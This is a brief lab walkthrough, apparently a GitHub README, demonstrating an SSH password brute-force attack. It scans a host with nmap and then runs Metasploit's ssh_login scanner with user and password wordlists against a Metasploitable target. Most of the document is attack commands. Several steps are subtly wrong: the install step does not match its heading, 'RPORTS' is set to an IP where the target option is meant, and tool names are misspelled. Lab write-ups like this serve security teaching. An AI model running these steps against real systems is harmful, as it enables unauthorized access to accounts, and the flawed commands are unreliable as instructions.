##### Bruteforce-demo🥷🏿⛓️‍💥
---
##### _This is a simple display of how bruteforce attack works, the lab highlights the importance of redteam thinking, and the relationship between information gathering and exploitation, from the nmap open port being the one explored for exploitation._

---

##### Tools Used
- Nmap.
- Kali.
- Metaspliotable OS.
- Metaspliot framework.
---

##### Steps

##### 1. install metaspliotable on your kali

```bash
sudo apt update
sudo apt install metasploit-framework -y
```
---

##### 2. Access msfconsole

```bash
msfconsole
```
---

##### 3. Run basic nmap command to view open ports

```bash
nmap 192.168.1.4
```
My port 22/tcp (ssh) is opened so we would be exploiting that.

---

##### 4. Access scan ssh on msfconsole

```bash
msf > search ssh
```
---

##### 5. Access the auxiliary Scanner for ssh

```bash
msf > use auxiliary/scanner/ssh/ssh_login
```
---

##### 6. Search Options to understand the requirements and set them up

```bash
msf > show options
```
---

##### 7. Set the PASS_FILE, USER_FILE, RHOSTS, BRUTEFORCE_SPEED AND VERBOSE, as communicated under options

```bash
msf > set RPORTS 192.168.1.4
msf > set VERBOSE true
msf > set USER_FILE "file path/text file"
msf > set PASS_FILE "file path/text file"
```
#### Then run

```bash
msf > run
```
---

